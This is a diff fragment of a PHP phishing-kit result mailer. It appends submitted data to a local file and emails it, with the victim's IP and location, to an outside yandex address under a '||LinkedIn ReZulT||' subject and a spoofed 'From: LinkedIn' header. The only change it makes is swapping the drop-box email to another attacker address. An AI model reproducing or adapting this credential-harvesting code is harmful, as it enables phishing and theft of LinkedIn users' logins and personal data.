@@ -42,7 +42,7 @@ $file = fopen("in.txt","a");
 fwrite($file,$message);
 fclose($file);
 
-$to = "awesome.xiaoling@yandex.com";
+$to = "chen.xiaol@yandex.com";
 $subject = "||LinkedIn ReZulT|| $ip ($cn)| ($ct)| ($cr)|";
 $headers = "From: LinkedIn $cc <noreply>";
 $headers .= $_POST['eMailAdd']."\n";
